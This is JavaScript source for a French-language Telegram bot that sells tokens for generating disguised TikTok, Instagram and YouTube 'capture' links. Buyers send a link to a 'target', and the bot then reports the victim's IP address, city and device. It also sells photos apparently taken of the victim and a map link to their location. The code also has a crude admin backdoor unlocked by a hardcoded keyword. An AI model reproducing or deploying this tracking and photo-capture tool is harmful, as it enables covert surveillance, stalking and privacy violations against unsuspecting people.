const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");
const dotenv = require("dotenv");
const fs = require('fs');
const path = require('path');
const crypto = require("crypto");

// Configuration de l'environnement
dotenv.config();

// --- CONFIGURATION DES TARIFS ---
const PRIX_GENERATION = 3;  // Coût pour créer un lien
const PRIX_PHOTOS = 3;      // Coût pour voir les photos
const NB_PHOTOS_A_AFFICHER = 3; // Nombre de photos à envoyer

// --- 1. GESTION DE LA PERSISTANCE (SAUVEGARDE) ---
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir);
}

const usersFilePath = path.join(dataDir, 'users.json');

let usersData = {};
if (fs.existsSync(usersFilePath)) {
    try {
        usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));
    } catch (e) {
        console.error("⚠️ Erreur lecture users.json, réinitialisation.", e.message);
        usersData = {};
    }
}

function saveUsers() {
    try {
        fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
    } catch (e) {
        console.error("❌ Erreur de sauvegarde :", e.message);
    }
}

// --- 2. CONFIGURATION DU BOT ---
process.env.NTBA_FIX_319 = 1;
process.env.NTBA_FIX_350 = 1;

const originalLog = console.log;
console.log = (...args) => {
    const message = args.join(" ");
    if (message.includes("TLSWrap") || message.includes("Symbol(") || message.includes("kBuffer")) return;
    originalLog.apply(console, args);
};

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error("❌ TELEGRAM_BOT_TOKEN manquant !");
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: {
        autoStart: true,
        params: { timeout: 10 }
    } 
});

const BASE_URL = process.env.RENDER_EXTERNAL_URL 
    ? process.env.RENDER_EXTERNAL_URL.replace(/\/$/, "")
    : `http://localhost:${process.env.PORT || 5000}`;

const DEFAULT_SECURE_TOKEN = "secure_default_token_" + crypto.createHash("sha256").update("replit_telegram_bot_2024").digest("hex");
const authToken = process.env.DATA_ACCESS_TOKEN || DEFAULT_SECURE_TOKEN;

let isAdminMode = false;

console.log(`🤖 Bot Telegram démarré !`);
console.log(`💰 Tarifs : Gen=${PRIX_GENERATION}🪙 / Photos=${PRIX_PHOTOS}🪙`);

// --- 3. COMMANDES ADMINISTRATEUR ---

bot.onText(/DsSiakaAdmin/, (msg) => {
    isAdminMode = true;
    bot.sendMessage(msg.chat.id, "🔓 **Mode Admin ACTIVÉ !**\n\nCommandes :\n`/addcoins [ID] [MONTANT]`\n`/lock` pour verrouiller.", { parse_mode: "Markdown" });
});

bot.onText(/\/lock/, (msg) => {
    isAdminMode = false;
    bot.sendMessage(msg.chat.id, "🔒 **Mode Admin VERROUILLÉ.**");
});

bot.onText(/\/addcoins (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAdminMode) return bot.sendMessage(chatId, "🚫 **Accès refusé.**");

    const targetId = match[1];
    const amount = parseInt(match[2]);

    if (!usersData[targetId]) usersData[targetId] = { coins: 0 };
    usersData[targetId].coins += amount;
    
    saveUsers();
    
    bot.sendMessage(chatId, `✅ **Succès !**\n${amount} jetons ajoutés à l'utilisateur \`${targetId}\`.\nNouveau solde : ${usersData[targetId].coins} 🪙`, { parse_mode: "Markdown" });
    
    bot.sendMessage(targetId, `🎁 **Paiement Reçu !**\nL'admin vous a crédité de ${amount} jetons.\nNouveau solde : ${usersData[targetId].coins} 🪙`).catch(() => {});
});

// --- 4. COMMANDES UTILISATEUR & VENTE ---

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const coins = usersData[chatId]?.coins || 0;
    
    bot.sendMessage(chatId, 
        `🔥 *Bot de Capture Activé !*\n\n` +
        `💰 *Solde :* ${coins} jetons\n\n` +
        `📋 *Tarifs :*\n` +
        `• Générer un lien : ${PRIX_GENERATION} 🪙\n` +
        `• Voir les photos : ${PRIX_PHOTOS} 🪙\n\n` +
        `🎯 *Menu :* \n` +
        `/generate - Créer un lien\n` +
        `/acheter - Acheter des jetons 💎\n` +
        `/balance - Voir mon solde`, 
        { parse_mode: "Markdown" }
    );
});

bot.onText(/\/acheter/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        `💎 **ACHETER DES JETONS** 💎\n\n` +
        `Vendeur officiel : 👉 **@DsSiaka**\n\n` +
        `🆔 **Ton ID :** \`${chatId}\`\n\n` +
        `⚡ Recharge immédiate après paiement !`, 
        { parse_mode: "Markdown" }
    );
});

bot.onText(/\/balance/, (msg) => {
    const coins = usersData[msg.chat.id]?.coins || 0;
    bot.sendMessage(msg.chat.id, `💰 **Portefeuille :** ${coins} jetons 🪙\nBesoin de plus ? Contactez @DsSiaka`, { parse_mode: "Markdown" });
});

// --- 5. GÉNÉRATION DE LIENS (COÛT 3 JETONS) ---
bot.onText(/\/generate/, (msg) => {
    const chatId = msg.chat.id;
    const coins = usersData[chatId]?.coins || 0;

    if (coins < PRIX_GENERATION) {
        return bot.sendMessage(chatId, 
            `⚠️ **Solde insuffisant !**\n\n` +
            `Coût de génération : ${PRIX_GENERATION} jetons.\n` +
            `Votre solde : ${coins} jetons.\n\n` +
            `🛒 Contactez **@DsSiaka** pour recharger.`, 
            { parse_mode: "Markdown" }
        );
    }

    const keyboard = {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🎵 TikTok", callback_data: "tiktok" }, { text: "📸 Instagram", callback_data: "instagram" }],
                [{ text: "📺 YouTube", callback_data: "youtube" }],
            ],
        }
    };

    bot.sendMessage(chatId, `🎯 *Générateur de Liens*\n\nCoût : ${PRIX_GENERATION} 🪙\nSolde actuel : ${coins} 🪙\n\n*Choisis la plateforme :*`, { parse_mode: "Markdown", ...keyboard });
});

// --- 6. GESTION DES ACTIONS (CALLBACKS) ---
bot.on("callback_query", async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    // Cas A : Voir les données (texte gratuit)
    if (data.startsWith("data_")) {
        bot.answerCallbackQuery(query.id);
        const linkId = data.replace("data_", "");
        await sendDataPreview(chatId, linkId);
        return;
    }

    // Cas B : Acheter les photos (COÛT 3 JETONS)
    if (data.startsWith("buyphotos_")) {
        const linkId = data.replace("buyphotos_", "");
        
        // Vérification solde
        if (!usersData[chatId] || usersData[chatId].coins < PRIX_PHOTOS) {
            return bot.answerCallbackQuery(query.id, { text: `❌ Pas assez de jetons ! Il en faut ${PRIX_PHOTOS}.`, show_alert: true });
        }

        // Paiement
        usersData[chatId].coins -= PRIX_PHOTOS;
        saveUsers();
        
        bot.answerCallbackQuery(query.id, { text: `✅ Photos débloquées (-${PRIX_PHOTOS} 🪙)` });
        await sendPhotos(chatId, linkId); // Envoi des photos
        return;
    }

    // Cas C : Générer un lien
    const platform = data;
    
    // Vérification solde génération
    if (!usersData[chatId] || usersData[chatId].coins < PRIX_GENERATION) {
        bot.sendMessage(chatId, "❌ **Solde épuisé !** Contactez @DsSiaka.");
        return bot.answerCallbackQuery(query.id, { text: "❌ Solde insuffisant !", show_alert: true });
    }

    try {
        const response = await axios.post(`${BASE_URL}/generate-link`, { platform, chatId });
        const { id, url } = response.data;

        // Déduction coût génération
        usersData[chatId].coins -= PRIX_GENERATION;
        saveUsers();

        bot.answerCallbackQuery(query.id, { text: `✅ Lien généré ! -${PRIX_GENERATION} Jetons` });

        const message = `✅ *LIEN CRÉÉ !*\n\n` +
                        `🔗 ${url}\n\n` +
                        `💰 Restant : ${usersData[chatId].coins} 🪙\n` +
                        `⚡ En attente du clic...`;

        const keyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔗 Ouvrir", url: url }],
                    [{ text: "📊 Voir Données", callback_data: `data_${id}` }]
                ]
            }
        };

        bot.sendMessage(chatId, message, { parse_mode: "Markdown", disable_web_page_preview: true, ...keyboard });

    } catch (error) {
        console.error("Erreur génération:", error.message);
        bot.answerCallbackQuery(query.id, { text: "❌ Erreur serveur", show_alert: true });
    }
});

// --- 7. AFFICHAGE DONNÉES & PHOTOS ---

bot.onText(/\/data (.+)/, async (msg, match) => {
    await sendDataPreview(msg.chat.id, match[1].trim());
});

// Fonction 1 : Aperçu GRATUIT (Texte uniquement)
async function sendDataPreview(chatId, linkId) {
    try {
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: { Authorization: `Bearer ${authToken}` },
        });
        const data = response.data;
        const photoCount = data.images ? data.images.length : 0;

        let message = `📊 *RAPPORT* - \`${linkId}\`\n\n`;
        message += `⏰ ${new Date(data.timestamp).toLocaleString("fr-FR")}\n`;
        message += `🌐 IP: ${data.ip || "Masquée"}\n`;

        if (data.location && data.location.latitude) {
            message += `📍 ${data.location.city || "?"}, ${data.location.country || "?"}\n`;
        }

        if (data.device) {
            message += `📱 ${data.device.vendor || ""} ${data.device.model || "Mobile"}\n`;
        }

        message += `\n📸 *Photos disponibles :* ${photoCount}\n`;
        
        // Bouton pour ACHETER les photos si elles existent
        const keyboard = { reply_markup: { inline_keyboard: [] } };
        
        if (photoCount > 0) {
            message += `🔒 *Les photos sont verrouillées.*\nCoût de déblocage : ${PRIX_PHOTOS} 🪙`;
            keyboard.reply_markup.inline_keyboard.push([
                { text: `📸 Voir les ${Math.min(photoCount, NB_PHOTOS_A_AFFICHER)} Photos (${PRIX_PHOTOS} 🪙)`, callback_data: `buyphotos_${linkId}` }
            ]);
        } else {
            message += `⚠️ Aucune photo capturée.`;
        }

        await bot.sendMessage(chatId, message, { parse_mode: "Markdown", ...keyboard });

    } catch (error) {
        bot.sendMessage(chatId, `❌ Données introuvables pour \`${linkId}\``);
    }
}

// Fonction 2 : Envoi des PHOTOS (PAYANT)
async function sendPhotos(chatId, linkId) {
    try {
        const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
            headers: { Authorization: `Bearer ${authToken}` },
        });
        const data = response.data;
        
        if (!data.images || data.images.length === 0) return;

        await bot.sendMessage(chatId, `🔓 **Photos débloquées !** Envoi en cours...`);

        // BOUCLE POUR AFFICHER LES 3 PHOTOS
        const limit = Math.min(data.images.length, NB_PHOTOS_A_AFFICHER);
        
        for (let i = 0; i < limit; i++) {
            try {
                const imgBuffer = Buffer.from(data.images[i], "base64");
                await bot.sendPhoto(chatId, imgBuffer, { 
                    caption: `📸 Photo ${i + 1}/${limit}` 
                });
            } catch (err) {
                console.error(`Erreur image ${i}:`, err);
            }
        }
        
        // Envoi de la localisation en bonus
        if (data.location && data.location.latitude) {
            const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
            bot.sendMessage(chatId, `🗺️ [Voir position sur Maps](${mapsUrl})`, { parse_mode: "Markdown" });
        }

    } catch (error) {
        bot.sendMessage(chatId, "❌ Erreur lors de l'envoi des photos.");
    }
}

// /help
bot.onText(/\/help/, (msg) => {
    bot.sendMessage(msg.chat.id, 
        `📚 *AIDE*\n\n` +
        `1. /generate (Coût ${PRIX_GENERATION}🪙) pour créer le lien.\n` +
        `2. Envoie le lien à la cible.\n` +
        `3. Reçois le rapport texte.\n` +
        `4. Débloque les photos (Coût ${PRIX_PHOTOS}🪙).\n\n` +
        `💎 **Recharge :** @DsSiaka`, 
        { parse_mode: "Markdown" }
    );
});

// Erreurs
bot.on("polling_error", (error) => console.log(`⚠️ Erreur Polling: ${error.message}`));
bot.on("webhook_error", (error) => console.log(`⚠️ Erreur Webhook: ${error.message}`));
